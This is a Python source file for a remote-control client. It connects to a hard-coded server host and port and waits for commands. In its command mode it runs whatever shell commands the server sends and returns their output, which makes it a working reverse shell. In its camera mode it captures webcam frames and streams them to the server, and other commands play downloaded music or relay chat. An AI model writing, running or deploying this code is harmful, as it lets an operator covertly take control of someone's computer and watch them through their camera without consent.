import socket, subprocess, os, ffmpeg, time
from pytube import YouTube
import soundfile as sf
import sounddevice as sd
import cv2, pyaudio, wave, pickle, struct, threading

class VideoAndAudio():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        self.statusCamera = False
        self.startMicrophone = False
        
        self.frame_lock = threading.Lock()
        self.video = cv2.VideoCapture(0)
        
        self.chunk = 1024
        self.format = pyaudio.paInt32
        self.channels = 1
        self.rate = 192000
        
        self.audio = pyaudio.PyAudio()
        
    def startCamera(self):
        try:
            self.statusCamera = True
            while self.statusCamera:
                ret, frame = self.video.read()
                if ret:
                    # Reduce frame rate
                    time.sleep(0.1)  # Send 10 frames per second

                    # Resize frame for faster transmission
                    frame = cv2.resize(frame, (640, 480))
                    
                    # Encode frame as JPEG
                    _, buffer = cv2.imencode('.jpg', frame)
                    data = pickle.dumps(buffer)
                    message_size = struct.pack("L", len(data))
                    
                    self.client_socket.sendall(message_size + data)
                    
                    response_from_server = self.client_socket.recv(4096).decode().strip()
                # Check for command from server to stop camera
                    if response_from_server.lower() == '/0cam':
                        self.statusCamera = False
                        self.stopCamera()
                        print("[ Exiting Camera Mode ]")
                        break
                    
        except Exception as e:
            print(f"Error starting camera: {e}")
            self.stopCamera()  # Ensure camera is stopped on error

    def stopCamera(self):
        self.statusCamera = False
        self.video.release()
        cv2.destroyAllWindows()


class MusicPlayer:
    def __init__(self):
        self.url = "https://www.youtube.com/watch?v=rzxLd9M5yp8"
        self.input_video_path = "input_video.mp4"
        self.output_audio_path = "output_audio.wav"
        self.is_playing = False 

    def downloadVideo(self):
        try:
            youtube_object = YouTube(self.url)
            video_stream = youtube_object.streams.get_highest_resolution()
            video_stream.download(filename=self.input_video_path)
            print(f"Downloaded video saved at: {self.input_video_path}")
        except Exception as e:
            print(f"Error downloading video: {e}")
            self.input_video_path = None
            
        if self.input_video_path:
            try:
                (
                    ffmpeg
                    .input(self.input_video_path)
                    .output(self.output_audio_path, format='wav', acodec='pcm_s16le', ar=44100, ac=2)
                    .overwrite_output()
                    .run()
                )
                print(f"Converted {self.input_video_path} to {self.output_audio_path}")
            except ffmpeg.Error as e:
                print(f"Error converting {self.input_video_path} to WAV: {e.stderr}")
        
    def playMusic(self):
        if self.output_audio_path:
            try:
                # Open the WAV file using soundfile
                wave_data, fs = sf.read(self.output_audio_path, dtype='float32')

                # Play the audio
                sd.play(wave_data, fs)
                print(f"Now playing: {self.output_audio_path}")
                self.is_playing = True

            except Exception as e:
                print(f"Error playing audio: {e}")
        else:
            print("File not found")

    def stopMusic(self):
        try:
            sd.stop()
            print("Audio playback stopped.")
            self.is_playing = False
            return True
        except Exception as e:
            print(f"Error stopping audio: {e}")
            return False
        
class chatClient:
    def __init__(self, client_socket):
        self.client_socket = client_socket
        self.statusChat = False
    
    def chatReceiver(self):
        self.statusChat = True
        print(f"[ Chat Mode Activated ]")
        
        while self.statusChat:
            response_from_server = self.client_socket.recv(4096).decode().strip()
            
            if response_from_server.lower() == '/0c':
                self.statusChat = False
                print("[ Exiting Chat Mode ]")
                break
            
            print(f"[Server]: {response_from_server}")        
            
class commandPrompt:
    def __init__(self, client_socket):
        self.client_socket = client_socket
        self.statusCmd = False
        
        self.refresh_interval = 0.1
    
    def commandReceiver(self):
        self.statusCmd = True
        print("[ Command Prompt Mode Activated ]")
        
        while self.statusCmd:
            command = self.client_socket.recv(4096).decode().strip()
            
            if command.lower() == 'quit':
                self.exit_command_prompt()
                print("[ Exiting Command Prompt Mode ]")
                self.statusCmd = False
                break
            else:
                output, status = self.executeCommand(command)
                if status == 0:
                    response = f"{output}\n[ Command executed was successful ]"
                else:
                    response = f"{output}\n[ Command executed has failed]"
                    
                self.client_socket.send(response.encode('ascii'))
                
            if command.strip() == '':
                print("[ Blank message received ]")
                continue
                
    def exit_command_prompt(self):
            if os.name == 'nt':
                os.system("exit")
                self.client_socket.send('/0cmd'.encode())
                
    def executeCommand(self, command):
        try:
            if command.startswith("cd "):
                directory = command[3:].strip()
                os.chdir(directory)
                return f"Changed directory to {os.getcwd()}", 0
            else:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)                
                return result.decode(), 0
            
        except subprocess.CalledProcessError as e:
            return e.output.decode(), e.returncode
        except Exception as e:
            return str(e), 1

class Client:
    def __init__(self, host='DESKTOP-I1O0U7L', port=12505):
        self.host = host
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((self.host, self.port))
        
        self.music_player = MusicPlayer()
        self.chat_client = chatClient(self.client_socket)
        self.command_prompt = commandPrompt(self.client_socket)
        self.camera = VideoAndAudio(self.client_socket)
        
        self.statusChat = False
        self.statusCmd = False
        
        print(f"[ Connected to server at {self.host}:{self.port} ]")
        
    def start(self):
        try:
            while True:
                response_from_server = self.client_socket.recv(4096).decode().strip()
                if not response_from_server:
                    print("[ Server has closed the connection. ]")
                    break
                print(response_from_server)
                
                if response_from_server.lower() == '/chat':
                    self.chat_client.chatReceiver()
                elif response_from_server.lower() == '/cmd':
                    self.command_prompt.commandReceiver()
                elif response_from_server == '/play':
                    if not self.music_player.is_playing:  # Check if music is already playing
                        self.music_player.downloadVideo()
                        self.music_player.playMusic()
                    else:
                        print("Music is already playing.")
                elif response_from_server == '/stop':
                    print("Stopping music playback...")
                    self.music_player.stopMusic()
                    print("Stopped.")
                elif response_from_server == '/camera':
                    self.camera.startCamera()
                    
        except ConnectionResetError:
            print("Connection reset by server.")
        finally:
            self.client_socket.close()

if __name__ == "__main__":
    client = Client()
    client.start()
